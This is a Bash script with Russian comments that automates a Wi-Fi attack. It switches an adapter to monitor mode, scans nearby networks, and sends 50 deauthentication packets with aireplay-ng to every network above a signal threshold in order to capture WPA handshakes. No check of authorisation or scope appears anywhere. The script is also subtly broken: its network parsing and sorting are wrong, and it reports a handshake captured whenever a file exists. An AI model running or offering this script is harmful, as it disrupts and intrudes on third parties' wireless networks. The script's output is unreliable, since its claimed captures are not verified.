#!/bin/bash

# Глобальные переменные и настройки
INTERFACE="wlx2023516539f7"               # Сетевой интерфейс
SIGNAL_THRESHOLD="-50"                    # Порог сигнала (в dBm)
SLEEP_TIME="5"                             # Время ожидания для сбора рукопожатий
OUTPUT_DIR="captures"                      # Директория для сохранённых файлов
SCAN_TIME="20"                             # Время для сканирования сетей
MAX_WAIT_TIME=120                          # Время ожидания для перехвата рукопожатия (в секундах) - 2 минуты
DEAUTH_PACKET_COUNT="50"                   # Количество пакетов деаутентификации для отправки
MAX_RETRIES=3                              # Количество попыток на одной сети

# Переключаем адаптер в режим монитора
echo "Переключаем адаптер в режим монитора..."
sudo ip link set $INTERFACE down
sudo iw dev $INTERFACE set type monitor
sudo ip link set $INTERFACE up

# Убиваем мешающие процессы
echo "Убиваем мешающие процессы..."
sudo airmon-ng check kill

# Запускаем мониторинг (airodump-ng в фоновом процессе)
echo "Запускаем мониторинг..."
sudo airodump-ng $INTERFACE --output-format csv --write networks.csv &

# Ожидаем некоторое время для сбора информации
sleep $SCAN_TIME

# Сортируем сети по уровню сигнала (в CSV)
echo "Сортируем сети по уровню сигнала..."
sort -t, -k 6 -n networks.csv > sorted_networks.csv

# Читаем отсортированные сети из файла
network_list=$(awk -F, 'NR > 2 {print $1, $4, $6}' sorted_networks.csv)

# Обрабатываем сети по очереди
for network in $network_list; do
    bssid=$(echo $network | cut -d' ' -f1)
    channel=$(echo $network | cut -d' ' -f2)
    signal=$(echo $network | cut -d' ' -f3)

    # Если уровень сигнала ниже порогового, пропускаем сеть
    if [ $signal -lt $SIGNAL_THRESHOLD ]; then
        echo "Сигнал для сети $bssid слишком слабый, пропускаем."
        continue
    fi

    echo "Обрабатываем сеть $bssid (канал $channel, сигнал $signal)..."

    # Создаём директорию для захвата, если её нет
    mkdir -p $OUTPUT_DIR

    # Попытки на одной сети
    retries=0
    while [ $retries -lt $MAX_RETRIES ]; do
        echo "Попытка #$((retries + 1)) на сети $bssid"

        # Запускаем airodump-ng на указанное количество времени для захвата рукопожатий
        sudo airodump-ng --bssid $bssid -c $channel --write "$OUTPUT_DIR/capture-$(echo $bssid | tr -d ':').pcap" $INTERFACE &

        # Получаем PID процесса airodump-ng
        capture_pid=$!

        # Проверяем файл на наличие рукопожатия
        wait_time=0
        capture_started=true
        while [ $wait_time -lt $MAX_WAIT_TIME ]; do
            # Проверяем наличие подключённых клиентов в выводе
            client_count=$(tail -n 20 "$OUTPUT_DIR/capture-$(echo $bssid | tr -d ':').csv" | grep -c "clients")

            # Если есть подключенные клиенты, отправляем пакеты деаутентификации
            if [ "$client_count" -gt 0 ]; then
                echo "Клиенты подключены, отправляем пакеты деаутентификации..."
                sudo aireplay-ng -0 $DEAUTH_PACKET_COUNT -a $bssid $INTERFACE
                echo "Пакеты деаутентификации отправлены."
            fi

            # Проверяем, завершился ли процесс захвата (появился ли файл pcap)
            if [ -f "$OUTPUT_DIR/capture-$(echo $bssid | tr -d ':').pcap" ]; then
                echo "Рукопожатие собрано для сети $bssid"
                kill $capture_pid   # Завершаем процесс захвата
                break
            fi

            # Если прошло время ожидания, но рукопожатие не собрано, переходим к следующей сети
            if [ $wait_time -ge $MAX_WAIT_TIME ]; then
                echo "Не удалось собрать рукопожатие за $MAX_WAIT_TIME секунд для сети $bssid"
                capture_started=false
                break
            fi

            # Увеличиваем время ожидания
            wait_time=$((wait_time + 1))
            sleep 1
        done

        # Если рукопожатие собрано, выходим из цикла
        if [ "$capture_started" = true ]; then
            break
        fi

        retries=$((retries + 1))
        echo "Попытка #$retries не удалась для сети $bssid"
        sleep 2  # Ждём перед следующей попыткой
    done

    # Если все попытки не удались, переходим к следующей сети
    if [ $retries -ge $MAX_RETRIES ]; then
        echo "Не удалось собрать рукопожатие для сети $bssid после $MAX_RETRIES попыток, переходим к следующей."
    fi
done

echo "Завершено!"
